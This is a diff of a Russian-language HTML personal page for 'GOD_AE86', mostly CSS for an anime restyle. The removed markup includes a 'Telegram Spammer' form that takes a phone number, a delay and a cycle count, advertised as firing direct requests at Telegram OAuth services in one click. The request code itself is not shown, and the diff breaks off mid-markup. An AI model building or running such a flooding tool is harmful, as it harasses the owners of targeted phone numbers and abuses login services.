@@ -1,308 +1,933 @@
 <!DOCTYPE html>
 <html lang="ru" data-theme="dark">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GOD_AE86 — Bio & TG Spammer</title>
-    <meta name="description" content="Персональная страница GOD_AE86. Telegram Spammer, проверка номера, QR.">
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>GOD_AE86 ✦ аниме-спамер</title>
+  <meta name="description" content="Персональная страница GOD_AE86. Аниме-вайб, неко API и Telegram-спамер.">
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"Person","name":"GOD_AE86","alternateName":"resivert","url":"https://t.me/GOD_AE86"}</script>
+  <script src="https://cdn.jsdelivr.net/npm/libphonenumber-js@1.11.12/bundle/libphonenumber-min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
+  <link href="https://fonts.googleapis.com/css2?family=Mochiy+Pop+One&family=Nunito:wght@400;600;700;800&display=swap" rel="stylesheet">
 
-    <!-- Микроразметка Person -->
-    <script type="application/ld+json">
-        {
-            "@context": "https://schema.org",
-            "@type": "Person",
-            "name": "GOD_AE86",
-            "alternateName": "resivert",
-            "url": "https://t.me/GOD_AE86",
-            "sameAs": [
-                "https://t.me/+lseqUuDD40c0N2Ni",
-                "https://t.me/god_internet"
-            ]
-        }
-    </script>
+  <style>
+    /* ═══════════════════════════════════════
+       ПЕРЕМЕННЫЕ — ТЁМНАЯ ТЕМА (дефолт)
+    ═══════════════════════════════════════ */
+    :root {
+      --bg:       #1a1025;
+      --bg2:      #22133a;
+      --card:     rgba(34,18,58,0.88);
+      --text:     #f2deff;
+      --muted:    #c9a8e2;
+      --accent:   #ffb7c5;
+      --purple:   #c77dff;
+      --teal:     #a8edea;
+      --border:   rgba(199,125,255,0.22);
+      --shadow:   0 4px 40px rgba(255,183,197,0.16);
+      --glow:     0 0 28px rgba(255,183,197,0.42);
+      --pglow:    0 0 28px rgba(199,125,255,0.4);
+      --radius:   22px;
+      --tr:       0.32s cubic-bezier(.4,0,.2,1);
+      --fh:       'Mochiy Pop One', cursive;
+      --fb:       'Nunito', sans-serif;
+    }
 
-    <!-- Библиотеки -->
-    <script src="https://cdn.jsdelivr.net/npm/libphonenumber-js@1.11.12/bundle/libphonenumber-min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/qrcode@1.5.3/build/qrcode.min.js"></script>
+    /* ── СВЕТЛАЯ ТЕМА ── */
+    [data-theme="light"] {
+      --bg:     #fce8f3;
+      --bg2:    #f9d8eb;
+      --card:   rgba(255,245,252,0.93);
+      --text:   #3a1a2e;
+      --muted:  #7a4a68;
+      --accent: #e05a82;
+      --purple: #9b59b6;
+      --border: rgba(224,90,130,0.22);
+      --shadow: 0 4px 30px rgba(224,90,130,0.13);
+      --glow:   0 0 24px rgba(224,90,130,0.38);
+      --pglow:  0 0 24px rgba(155,89,182,0.35);
+    }
 
-    <style>
-        :root {
-            --bg: #0f0f14;
-            --card: #1a1a24;
-            --text: #e0e0e8;
-            --muted: #a0a0b5;
-            --accent: #7c5cfc;
-            --border: rgba(255,255,255,0.06);
-            --shadow: 0 15px 30px rgba(0,0,0,0.4);
-            --input: #1e1e2a;
-            --radius: 14px;
-            --transition: 0.25s ease;
-        }
-        [data-theme="light"] {
-            --bg: #f2f2f7;
-            --card: #ffffff;
-            --text: #1a1a2e;
-            --muted: #4a4a6a;
-            --accent: #6c63ff;
-            --border: rgba(0,0,0,0.06);
-            --shadow: 0 10px 25px rgba(0,0,0,0.06);
-            --input: #f0f0f8;
-        }
-        * { margin:0; padding:0; box-sizing:border-box; }
-        html { font-size: 16px; scroll-behavior: smooth; }
-        body {
-            font-family: 'Segoe UI', system-ui, sans-serif;
-            background: var(--bg);
-            color: var(--text);
-            min-height: 100vh;
-            padding: 2rem 1rem;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            transition: background var(--transition), color var(--transition);
-        }
-        .container { width: 100%; max-width: 880px; display: flex; flex-direction: column; gap: 2rem; }
-        .card {
-            background: var(--card);
-            border-radius: var(--radius);
-            padding: 2rem;
-            box-shadow: var(--shadow);
-            border: 1px solid var(--border);
-            transition: all var(--transition);
-        }
-        .card:hover { box-shadow: 0 20px 35px rgba(0,0,0,0.5); }
-        nav.tabs { display: flex; gap: 0.5rem; margin-bottom: 1rem; flex-wrap: wrap; }
-        .tab {
-            background: var(--card);
-            border: 1px solid var(--border);
-            padding: 0.6rem 1.4rem;
-            border-radius: 2rem;
-            cursor: pointer;
-            font-weight: 500;
-            color: var(--muted);
-            transition: all var(--transition);
-            user-select: none;
-        }
-        .tab.active, .tab:hover { background: var(--accent); color: #fff; border-color: var(--accent); }
-        .tab-content { display: none; }
-        .tab-content.active { display: block; }
-        .profile { display: flex; align-items: center; gap: 2rem; flex-wrap: wrap; justify-content: center; text-align: center; }
-        .avatar {
-            width: 120px; height: 120px; border-radius: 50%; overflow: hidden;
-            border: 3px solid var(--accent); box-shadow: 0 0 25px rgba(124,92,252,0.3);
-        }
-        .spammer-section h2 { margin-bottom: 0.5rem; }
-        .spammer-section .subtitle { color: var(--muted); margin-bottom: 1.5rem; font-size: 0.9rem; }
-        .form-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; margin-bottom: 1.5rem; }
-        .form-grid .field { display: flex; flex-direction: column; gap: 0.3rem; }
-        .field label { font-weight: 500; color: var(--accent); font-size: 0.9rem; }
-        .field input {
-            padding: 0.7rem 1rem;
-            background: var(--input);
-            border: 1px solid var(--border);
-            border-radius: 8px;
-            color: var(--text);
-            font-family: inherit;
-        }
-        .field input:focus { border-color: var(--accent); outline: none; }
-        .checkbox-group {
-            display: flex; flex-wrap: wrap; gap: 1rem;
-            background: var(--input); padding: 1rem; border-radius: 8px;
-            margin-bottom: 1.5rem;
-        }
-        .checkbox-group span { color: var(--muted); }
-        .actions { display: flex; gap: 0.8rem; flex-wrap: wrap; margin: 1rem 0; }
-        .btn {
-            background: var(--accent); color: #fff; border: none;
-            padding: 0.7rem 1.4rem; border-radius: 8px; cursor: pointer;
-            font-weight: 600; font-size: 0.9rem; transition: all var(--transition);
-            user-select: none;
-        }
-        .btn:hover { background: #9475ff; box-shadow: 0 8px 18px rgba(124,92,252,0.4); }
-        .btn:disabled { opacity: 0.6; pointer-events: none; }
-        .btn.outline {
-            background: transparent; border: 1px solid var(--accent); color: var(--accent);
-        }
-        .btn.outline:hover { background: rgba(124,92,252,0.1); }
-        .log {
-            background: #15151e; border: 1px solid var(--border);
-            border-radius: 8px; padding: 1rem; height: 220px; overflow-y: auto;
-            font-family: 'Courier New', monospace; font-size: 0.8rem; color: #c0c0d0;
-        }
-        .log .ok { color: #6fcf97; } .log .err { color: #eb5757; } .log .info { color: #f2c94c; }
-        .social-links { display: flex; gap: 1rem; margin-top: 1rem; justify-content: center; }
-        .social-btn {
-            display: inline-flex; align-items: center; justify-content: center;
-            width: 44px; height: 44px; border-radius: 50%;
-            border: 1px solid var(--border); color: var(--muted);
-            transition: all var(--transition);
-        }
-        .social-btn:hover { border-color: var(--accent); color: var(--accent); background: rgba(124,92,252,0.1); }
-        .social-btn svg { width: 20px; height: 20px; fill: currentColor; }
-        #validateOut { margin:0.5rem 0; font-size:0.9rem; }
-        @media (max-width: 640px) {
-            .form-grid { grid-template-columns: 1fr; }
-            .profile { flex-direction: column; }
-        }
-    </style>
+    /* ── АНИМЕ-РЕЖИМ (поверх любой темы) ── */
+    [data-anime="on"] {
+      --accent:  #ff4da6;
+      --purple:  #bf00ff;
+      --border:  rgba(191,0,255,0.32);
+      --shadow:  0 4px 50px rgba(255,77,166,0.3);
+      --glow:    0 0 40px rgba(255,77,166,0.6);
+      --pglow:   0 0 40px rgba(191,0,255,0.55);
+    }
+
+    /* ═══════════════════════════════════════
+       БАЗОВЫЕ СБРОСЫ
+    ═══════════════════════════════════════ */
+    *, *::before, *::after { margin:0; padding:0; box-sizing:border-box; }
+
+    html { scroll-behavior: smooth; }
+
+    body {
+      font-family: var(--fb);
+      background: var(--bg);
+      color: var(--text);
+      min-height: 100vh;
+      overflow-x: hidden;
+      transition: background .5s, color .5s;
+    }
+
+    /* ═══════════════════════════════════════
+       ФОНОВЫЙ СЛОЙ — ГРАДИЕНТ-МЕШ
+    ═══════════════════════════════════════ */
+    body::before {
+      content: '';
+      position: fixed; inset: 0; z-index: 0; pointer-events: none;
+      background:
+        radial-gradient(ellipse 60% 55% at 10% 10%, rgba(199,125,255,.14) 0%, transparent 60%),
+        radial-gradient(ellipse 50% 45% at 90% 85%, rgba(255,183,197,.12) 0%, transparent 55%),
+        radial-gradient(ellipse 40% 40% at 55% 50%, rgba(168,237,234,.05) 0%, transparent 60%);
+      transition: opacity .5s;
+    }
+
+    /* ═══════════════════════════════════════
+       АНИМИРОВАННЫЙ ФОН (сакура / звёзды)
+    ═══════════════════════════════════════ */
+    #vfx-bg {
+      position: fixed; inset: 0;
+      pointer-events: none; z-index: 0;
+      overflow: hidden;
+    }
+
+    /* Лепесток */
+    .petal {
+      position: absolute;
+      top: -60px;
+      border-radius: 50% 0 50% 0;
+      background: radial-gradient(ellipse at 35% 35%, #ffcfd9 0%, #ff85a1 55%, rgba(255,100,140,0) 100%);
+      opacity: .75;
+      animation: petalFall linear infinite;
+    }
+    @keyframes petalFall {
+      0%   { transform: translateY(-60px)  rotate(0deg)   translateX(0px);  opacity:.8; }
+      25%  { transform: translateY(25vh)   rotate(90deg)  translateX(28px);  }
+      50%  { transform: translateY(50vh)   rotate(180deg) translateX(-18px); opacity:.6; }
+      75%  { transform: translateY(75vh)   rotate(270deg) translateX(22px);  }
+      100% { transform: translateY(115vh)  rotate(360deg) translateX(0px);  opacity:0;  }
+    }
+
+    /* Падающая звезда */
+    .star-vfx {
+      position: absolute;
+      border-radius: 50%;
+      background: var(--accent);
+      box-shadow: 0 0 8px var(--accent), 0 0 20px var(--purple);
+      opacity: 0;
+      animation: starDrop linear infinite;
+    }
+    @keyframes starDrop {
+      0%   { transform: translateY(-20px) scale(1);   opacity: 0; }
+      8%   { opacity: 1; }
+      92%  { opacity: .7; }
+      100% { transform: translateY(115vh) scale(.4); opacity: 0; }
+    }
+
+    /* ═══════════════════════════════════════
+       ФИКСИРОВАННЫЕ КНОПКИ (угол)
+    ═══════════════════════════════════════ */
+    .fixed-top {
+      position: fixed; top: 1rem; right: 1rem;
+      display: flex; gap: .55rem; z-index: 200;
+    }
+
+    .icon-btn {
+      width: 46px; height: 46px;
+      border-radius: 50%;
+      background: var(--card);
+      border: 1.5px solid var(--border);
+      cursor: pointer; font-size: 1.25rem;
+      display: flex; align-items: center; justify-content: center;
+      box-shadow: var(--shadow);
+      backdrop-filter: blur(14px);
+      transition: all var(--tr);
+      color: var(--text);
+    }
+    .icon-btn:hover {
+      transform: scale(1.12) rotate(12deg);
+      box-shadow: var(--glow);
+      border-color: var(--accent);
+    }
+
+    /* ═══════════════════════════════════════
+       ОСНОВНОЙ LAYOUT
+    ═══════════════════════════════════════ */
+    .page-wrap {
+      position: relative; z-index: 1;
+      display: flex; flex-direction: column; align-items: center;
+      padding: 2.2rem 1rem 5rem;
+      min-height: 100vh;
+    }
+
+    .container {
+      width: 100%; max-width: 920px;
+      display: flex; flex-direction: column;
+      gap: 1.6rem;
+    }
+
+    /* ═══════════════════════════════════════
+       ТАБЫ
+    ═══════════════════════════════════════ */
+    nav.tabs {
+      display: flex; gap: .55rem; flex-wrap: wrap;
+      padding: .6rem;
+      background: var(--card);
+      border-radius: var(--radius);
+      border: 1px solid var(--border);
+      backdrop-filter: blur(14px);
+      box-shadow: var(--shadow);
+    }
+
+    .tab {
+      flex: 1; min-width: 80px;
+      background: transparent; border: none;
+      padding: .65rem 1.3rem;
+      border-radius: calc(var(--radius) - 6px);
+      cursor: pointer;
+      font-weight: 800; font-family: var(--fh);
+      font-size: .72rem; letter-spacing: .2px;
+      color: var(--muted);
+      transition: all var(--tr);
+      white-space: nowrap; text-align: center;
+    }
+    .tab.active, .tab:hover {
+      background: linear-gradient(135deg, var(--accent) 0%, var(--purple) 100%);
+      color: #fff;
+      box-shadow: 0 0 22px rgba(255,183,197,.45);
+      transform: translateY(-2px);
+    }
+
+    .tab-content { display: none; }
+    .tab-content.active {
+      display: block;
+      animation: fadeSlide .42s ease;
+    }
+    @keyframes fadeSlide {
+      from { opacity:0; transform:translateY(14px); }
+      to   { opacity:1; transform:translateY(0); }
+    }
+
+    /* ═══════════════════════════════════════
+       КАРТОЧКИ
+    ═══════════════════════════════════════ */
+    .card {
+      background: var(--card);
+      border-radius: var(--radius);
+      padding: 2rem;
+      box-shadow: var(--shadow);
+      border: 1px solid var(--border);
+      backdrop-filter: blur(14px);
+      transition: box-shadow var(--tr), border-color var(--tr);
+      position: relative; overflow: hidden;
+    }
+    .card::before {
+      content: '';
+      position: absolute; top: -40%; left: -60%;
+      width: 38%; height: 200%;
+      background: linear-gradient(90deg, transparent, rgba(255,255,255,.04), transparent);
+      transform: rotate(15deg);
+      animation: shimmer 5s 1s infinite;
+      pointer-events: none;
+    }
+    @keyframes shimmer {
+      0%   { left: -60%; }
+      100% { left: 160%; }
+    }
+    .card:hover {
+      box-shadow: var(--glow), var(--shadow);
+      border-color: var(--accent);
+    }
+
+    /* ═══════════════════════════════════════
+       БИО / ПРОФИЛЬ
+    ═══════════════════════════════════════ */
+    .profile {
+      display: flex; align-items: center;
+      gap: 2.5rem; flex-wrap: wrap;
+      justify-content: center;
+    }
+
+    .avatar-wrap { position: relative; flex-shrink: 0; }
+
+    .avatar {
+      width: 155px; height: 155px;
+      border-radius: 50%; overflow: hidden;
+      border: 3px solid transparent;
+      background:
+        linear-gradient(var(--card), var(--card)) padding-box,
+        linear-gradient(135deg, var(--accent), var(--purple)) border-box;
+      box-shadow:
+        0 0 0 6px rgba(199,125,255,.12),
+        0 0 40px rgba(255,183,197,.5),
+        0 0 80px rgba(199,125,255,.22);
+      transition: all .4s;
+    }
+    .avatar:hover { transform: rotate(6deg) scale(1.07); box-shadow: 0 0 0 6px rgba(199,125,255,.18), 0 0 55px rgba(255,183,197,.65); }
+    .avatar img { width:100%; height:100%; object-fit:cover; display:block; }
+
+    .avatar-ring {
+      position: absolute; inset: -8px;
+      border-radius: 50%;
+      border: 2px dashed var(--purple);
+      opacity: .5; pointer-events: none;
+      animation: spin 14s linear infinite;
+    }
+    .avatar-ring2 {
+      position: absolute; inset: -16px;
+      border-radius: 50%;
+      border: 1px dotted var(--accent);
+      opacity: .28; pointer-events: none;
+      animation: spin 22s linear infinite reverse;
+    }
+    @keyframes spin { to { transform:rotate(360deg); } }
+
+    .bio-info { text-align: center; flex:1; min-width:200px; }
+
+    .bio-name {
+      font-family: var(--fh);
+      font-size: 2.1rem; line-height:1.1;
+      background: linear-gradient(135deg, var(--accent) 20%, var(--purple) 80%);
+      -webkit-background-clip: text; -webkit-text-fill-color: transparent;
+      background-clip: text;
+      margin-bottom: .45rem;
+      filter: drop-shadow(0 0 12px rgba(255,183,197,.35));
+    }
+
+    .bio-handle {
+      color: var(--purple); font-size: .95rem;
+      font-weight: 700; margin-bottom: .5rem;
+    }
+    .bio-desc {
+      color: var(--muted); font-size: .9rem;
+      line-height: 1.6; margin-bottom: 1rem;
+    }
+
+    .badges { display:flex; flex-wrap:wrap; gap:.4rem; justify-content:center; margin-bottom:.8rem; }
+    .badge {
+      display: inline-block;
+      padding: .22rem .85rem;
+      border-radius: 2rem;
+      background: rgba(255,183,197,.1);
+      border: 1px solid rgba(255,183,197,.22);
+      color: var(--accent); font-size: .75rem; font-weight:700;
+      transition: all var(--tr);
+    }
+    .badge:hover { background: rgba(255,183,197,.2); transform:translateY(-2px); }
+
+    /* Цитата */
+    .quote-box {
+      margin-top: 1rem;
+      padding: 1rem 1.2rem;
+      background: rgba(199,125,255,.08);
+      border-left: 3px solid var(--purple);
+      border-radius: 0 16px 16px 0;
+      text-align: left;
+      position: relative;
+    }
+    .quote-box::before {
+      content: '❝'; font-size: 2rem;
+      color: var(--purple); opacity:.4;
+      position: absolute; top:-6px; left:8px;
+      line-height:1;
+    }
+    .quote-text {
+      font-style: italic; color: var(--muted);
+      font-size: .85rem; line-height:1.55;
+      padding-left:.4rem;
+    }
+    .quote-src {
+      color: var(--accent); font-weight:700;
+      font-size: .78rem; margin-top:.5rem;
+    }
+    .quote-btn {
+      margin-top: .75rem;
+      background: transparent;
+      border: 1px solid var(--border);
+      color: var(--muted); border-radius: 2rem;
+      padding: .3rem 1rem; cursor: pointer;
+      font-size: .75rem; font-family: var(--fb);
+      transition: all var(--tr);
+    }
+    .quote-btn:hover { border-color:var(--accent); color:var(--accent); transform:scale(1.04); }
+
+    /* Соцсети */
+    .social-links {
+      display:flex; gap:.75rem; margin-top:1rem;
+      justify-content:center; flex-wrap:wrap;
+    }
+    .social-btn {
+      display:inline-flex; align-items:center; justify-content:center;
+      width:48px; height:48px; border-radius:50%;
+      border: 1.5px solid var(--border);
+      color: var(--muted);
+      background: rgba(199,125,255,.06);
+      transition: all var(--tr);
+      text-decoration: none; font-size:1.1rem;
+    }
+    .social-btn:hover {
+      border-color: var(--accent); color: var(--accent);
+      background: rgba(255,183,197,.13);
+      transform: translateY(-4px) scale(1.1);
+      box-shadow: 0 0 18px rgba(255,183,197,.45);
+    }
+    .social-btn svg { width:20px; height:20px; fill:currentColor; }
+
+    /* ═══════════════════════════════════════
+       СПАМЕР
+    ═══════════════════════════════════════ */
+    .spammer-title {
+      font-family: var(--fh);
+      font-size: 1.35rem;
+      background: linear-gradient(135deg, var(--accent), var(--purple));
+      -webkit-background-clip:text; -webkit-text-fill-color:transparent;
+      background-clip:text;
+      margin-bottom:.3rem;
+    }
+    .subtitle { color:var(--muted); font-size:.85rem; margin-bottom:1.5rem; }
+
+    .form-grid {
+      display:grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 1rem; margin-bottom:1.5rem;
+    }
+
+    .field label {
+      display:block; font-weight:800;
+      color:var(--accent); font-size:.82rem;
+      margin-bottom:.4rem;
+    }
+    .field input {
+      width:100%; padding:.76rem 1rem;
+      background: rgba(199,125,255,.07);
+      border: 1.5px solid var(--border);
+      border-radius: 14px;
+      color: var(--text);
+      font-family: var(--fb); font-size:.88rem;
+      outline: none;
+      transition: all var(--tr);
+    }
+    .field input:focus {
+      border-color: var(--accent);
+      box-shadow: 0 0 0 3px rgba(255,183,197,.15), 0 0 18px rgba(255,183,197,.2);
+      background: rgba(255,183,197,.05);
+    }
+    .field input::placeholder { color:var(--muted); opacity:.55; }
+
+    .checkbox-group {
+      display:flex; flex-wrap:wrap; gap:.6rem;
+      background: rgba(199,125,255,.06);
+      padding: 1rem; border-radius:16px;
+      border: 1px solid var(--border);
+      margin-bottom:1.5rem;
+    }
+    .checkbox-group .cg-title {
+      width:100%; color:var(--muted);
+      font-weight:800; font-size:.85rem;
+      margin-bottom:.25rem;
+    }
+    .checkbox-group label {
+      display:flex; align-items:center; gap:.4rem;
+      padding: .3rem .85rem;
+      background: rgba(255,183,197,.07);
+      border-radius:2rem;
+      border: 1px solid transparent;
+      cursor:pointer; font-size:.78rem; color:var(--muted);
+      transition: all var(--tr);
+    }
+    .checkbox-group label:hover { border-color:var(--accent); color:var(--accent); }
+    .checkbox-group input[type="checkbox"] { accent-color:var(--accent); }
+
+    .actions { display:flex; gap:.7rem; flex-wrap:wrap; margin:1rem 0; }
+
+    .btn {
+      border:none; cursor:pointer;
+      font-weight:800; font-family:var(--fb);
+      font-size:.83rem; letter-spacing:.1px;
+      padding: .76rem 1.4rem; border-radius:14px;
+      transition: all var(--tr);
+      position:relative; overflow:hidden;
+    }
+    .btn::after {
+      content:''; position:absolute; inset:0;
+      background:linear-gradient(135deg,rgba(255,255,255,.18),transparent);
+      opacity:0; transition:opacity .2s;
+    }
+    .btn:hover::after { opacity:1; }
+
+    .btn-primary {
+      background: linear-gradient(135deg, var(--accent) 0%, var(--purple) 100%);
+      color:#fff;
+      box-shadow: 0 4px 22px rgba(255,183,197,.38);
+    }
+    .btn-primary:hover {
+      transform: translateY(-2px) scale(1.04);
+      box-shadow: 0 6px 32px rgba(255,183,197,.55);
+    }
+    .btn-primary:active { transform: scale(.97); }
+
+    .btn-outline {
+      background:transparent;
+      border:1.5px solid var(--border);
+      color:var(--muted);
+    }
+    .btn-outline:hover {
+      border-color:var(--accent); color:var(--accent);
+      background:rgba(255,183,197,.09);
+      transform:translateY(-1px);
+    }
+
+    #validateOut {
+      min-height:1.8rem;
+      margin:.5rem 0; color:var(--accent);
+      font-size:.8rem; line-height:1.5;
+      padding:.5rem .9rem; border-radius:12px;
+      background:rgba(255,183,197,.06);
+    }
+
+    .log {
+      background: rgba(12,5,24,.85);
+      border:1px solid var(--border);
+      border-radius:16px; padding:1rem;
+      height:230px; overflow-y:auto;
+      font-family:'Courier New',monospace; font-size:.77rem;
+      color:#d0b0e4;
+      scrollbar-width:thin; scrollbar-color:var(--accent) transparent;
+    }
+    .log::-webkit-scrollbar { width:4px; }
+    .log::-webkit-scrollbar-track { background:transparent; }
+    .log::-webkit-scrollbar-thumb { background:var(--accent); border-radius:2px; }
+    .log .ok   { color:#90e4b2; }
+    .log .err  { color:#ff8fa3; }
+    .log .info { color:#f5d76e; }
+
+    /* ═══════════════════════════════════════
+       МУЗЫКА
+    ═══════════════════════════════════════ */
+    .music-wrap { text-align:center; }
+    .music-title {
+      font-family:var(--fh); font-size:1.5rem;
+      color:var(--accent); margin-bottom:.5rem;
+    }
+    .music-sub { color:var(--muted); font-size:.85rem; margin-bottom:1.5rem; }
+    audio {
+      width:100%; border-radius:14px;
+      accent-color:var(--accent);
+      filter: drop-shadow(0 0 8px rgba(255,183,197,.25));
+    }
+    .now-playing {
+      margin-top:1rem; font-size:.82rem; color:var(--muted);
+      display:flex; align-items:center; justify-content:center; gap:.55rem;
+    }
+    .now-playing span {
+      width:9px; height:9px; border-radius:50%;
+      background:var(--accent);
+      display:inline-block;
+      animation:pulseNow 1.6s ease-in-out infinite;
+    }
+    @keyframes pulseNow {
+      0%,100%{ transform:scale(1); opacity:1; }
+      50%    { transform:scale(1.5); opacity:.5; }
+    }
+
+    /* ═══════════════════════════════════════
+       ГАЛЕРЕЯ
+    ═══════════════════════════════════════ */
+    .gallery-title {
+      font-family:var(--fh); font-size:1.4rem;
+      color:var(--accent); margin-bottom:.4rem;
+    }
+    .gallery-sub { color:var(--muted); font-size:.83rem; margin-bottom:1rem; }
+    #gallery {
+      display:grid;
+      grid-template-columns:repeat(auto-fill, minmax(155px,1fr));
+      gap:1rem;
+    }
+    #gallery img {
+      width:100%; aspect-ratio:1; object-fit:cover;
+      border-radius:16px; border:1.5px solid var(--border);
+      transition: all .32s;
+      cursor:pointer;
+    }
+    #gallery img:hover {
+      transform:scale(1.06) rotate(1.5deg);
+      box-shadow:0 0 24px rgba(255,183,197,.45);
+      border-color:var(--accent);
+    }
+
+    /* ═══════════════════════════════════════
+       НEKO В УГЛУ
+    ═══════════════════════════════════════ */
+    .neko-wrap {
+      position:fixed; bottom:1.3rem; right:1.3rem;
+      z-index:150; display:flex; flex-direction:column;
+      align-items:center; gap:.4rem;
+    }
+    .neko-tip {
+      background:var(--card); border:1px solid var(--border);
+      color:var(--accent); font-size:.65rem;
+      padding:.25rem .7rem; border-radius:2rem;
+      backdrop-filter:blur(10px);
+      pointer-events:none; opacity:0;
+      transition:opacity .3s; white-space:nowrap;
+      box-shadow:var(--shadow);
+    }
+    .neko-corner {
+      width:72px; height:72px; border-radius:50%;
+      border:2.5px solid var(--accent); overflow:hidden;
+      box-shadow:0 0 22px rgba(255,183,197,.55);
+      cursor:pointer; transition:all .3s;
+    }
+    .neko-corner:hover { transform:scale(1.12); box-shadow:0 0 35px rgba(255,183,197,.75); }
+    .neko-corner:hover + .neko-tip { opacity:1; }
+    .neko-corner img { width:100%; height:100%; object-fit:cover; transition:transform .4s; }
+    .neko-corner:hover img { transform:scale(1.18); }
+
+    /* ═══════════════════════════════════════
+       АДАПТИВ
+    ═══════════════════════════════════════ */
+    @media (max-width:660px) {
+      .form-grid      { grid-template-columns:1fr; }
+      .profile        { flex-direction:column; gap:1.6rem; }
+      .bio-name       { font-size:1.6rem; }
+      .card           { padding:1.4rem; }
+      .avatar         { width:125px; height:125px; }
+      .actions        { gap:.5rem; }
+      .btn            { font-size:.76rem; padding:.66rem 1.1rem; }
+      #gallery        { grid-template-columns:repeat(auto-fill,minmax(120px,1fr)); }
+    }
+
+    /* ── Скроллбар ── */
+    ::-webkit-scrollbar        { width:6px; }
+    ::-webkit-scrollbar-track  { background:var(--bg); }
+    ::-webkit-scrollbar-thumb  { background:var(--accent); border-radius:3px; }
+  </style>
 </head>
 <body>
 
-<!-- Переключатель темы -->
-<button id="themeToggle" aria-label="Сменить тему"
-        style="position:fixed;top:1rem;right:1rem;z-index:10;background:var(--card);border:1px solid var(--border);border-radius:50%;width:44px;height:44px;display:flex;align-items:center;justify-content:center;cursor:pointer;box-shadow:var(--shadow);">
-    <svg id="iconDark" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
-        <circle cx="12" cy="12" r="5"/><path d="M12 1v2M12 21v2M4.22 4.22l1.42 1.42M18.36 18.36l1.42 1.42M1 12h2M21 12h2M4.22 19.78l1.42-1.42M18.36 5.64l1.42-1.42"/>
-    </svg>
-    <svg id="iconLight" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" style="display:none;">
-        <path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/>
-    </svg>
-</button>
+<!-- ═══════ АНИМИРОВАННЫЙ ФОН ═══════ -->
+<div id="vfx-bg"></div>
 
-<div class="container">
-    <!-- Навигация -->
-    <nav class="tabs">
-        <div class="tab active" data-tab="bio">👤 Био</div>
-        <div class="tab" data-tab="spammer">📡 TG Spammer</div>
-        <div class="tab" data-tab="music">🎵 Музыка</div>
-        <div class="tab" data-tab="gallery">🖼️ Галерея</div>
-    </nav>
-
-    <!-- Био -->
-    <div class="tab-content active" id="tab-bio">
-        <div class="card profile">
-            <div class="avatar">
-                <img src="avatar.jpg" alt="GOD_AE86"
-                     style="width:100%;height:100%;object-fit:cover;"
-                     onerror="this.parentNode.innerHTML='<div style=width:100%;height:100%;display:flex;align-items:center;justify-content:center;font-size:2.5rem;color:var(--accent)>G</div>'">
-            </div>
-            <div>
-                <h1>GOD_AE86</h1>
-                <p style="color:var(--accent);">@resivert / @GOD_AE86</p>
-                <p style="margin-top:0.5rem;color:var(--muted);">Тексты, батлы, инструменты. Telegram Spammer в подарок.</p>
-                <div class="social-links">
-                    <a href="https://t.me/GOD_AE86" class="social-btn" target="_blank" aria-label="Telegram">
-                        <svg viewBox="0 0 24 24"><path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.562 8.161c-.18 1.897-.962 6.502-1.359 8.627-.168.9-.5 1.201-.82 1.23-.697.064-1.226-.46-1.901-.903-1.056-.692-1.653-1.123-2.678-1.799-1.185-.781-.417-1.21.258-1.911.177-.184 3.247-2.977 3.307-3.23.007-.032.015-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.139-5.062 3.345-.479.329-.913.489-1.302.481-.428-.009-1.252-.242-1.865-.441-.752-.245-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.831-2.529 6.998-3.015 3.333-1.386 4.025-1.627 4.476-1.635.099-.002.321.023.465.141.12.098.153.228.169.321.015.094.034.307.019.474z"/></svg>
-                    </a>
-                    <a href="https://t.me/+lseqUuDD40c0N2Ni" class="social-btn" target="_blank" aria-label="Канал">
-                        <svg viewBox="0 0 24 24"><path d="M12 0c-6.627 0-12 5.373-12 12s5.373 12 12 12 12-5.373 12-12-5.373-12-12-12zm0 2c5.523 0 10 4.477 10 10s-4.477 10-10 10-10-4.477-10-10 4.477-10 10-10zm-3 6c-1.104 0-2 .896-2 2v4c0 1.104.896 2 2 2h6c1.104 0 2-.896 2-2v-4c0-1.104-.896-2-2-2h-6zm1 2h4l-2 2.5-1-1.5-1 2-1.5-2-1.5 2.5v-3.5z"/></svg>
-                    </a>
-                    <a href="https://t.me/god_internet" class="social-btn" target="_blank" aria-label="Тексты">
-                        <svg viewBox="0 0 24 24"><path d="M14 2h-8c-1.1 0-2 .9-2 2v16c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2v-12l-6-6zm-1 1.5l4.5 4.5h-4.5v-4.5zm-7 16.5v-16h5v6h6v10h-11z"/></svg>
-                    </a>
-                </div>
-            </div>
-        </div>
-    </div>
-
-    <!-- TG Spammer -->
-    <div class="tab-content" id="tab-spammer">
-        <div class="card spammer-section">
-            <h2>📡 Telegram Spammer</h2>
-            <p class="subtitle">Прямые запросы к OAuth‑сервисам Telegram (no‑cors). Без прокси, в один клик.</p>
-
-            <div class="form-grid">
-                <div class="field">
-                    <label>📱 Номер телефона</label>
-                    <input type="text" id="phone" placeholder="+79001234567">
-                </div>
-                <div class="field">
-                    <label>⏱️ Задержка (сек)</label>
-                    <input type="number" id="delay" value="0.5" min="0.1" step="0.1">
-                </div>
-                <div class="field">
-                    <label>🔄 Число циклов</label>
-                    <input type="number" id="cycles" value="3" min="0">
-                </div>
-            </div>
-
-            <div class="checkbox-group" id="svcList">
-                <span>🎯 Сервисы:</span>
-                <!-- заполняется из spammer.js -->
-            </div>
-
-            <div class="actions">
-                <button class="btn" id="startBtn">▶ Запустить</button>
-                <button class="btn outline" id="stopBtn">⏹ Стоп</button>
-                <button class="btn outline" id="clearBtn">🧹 Очистить лог</button>
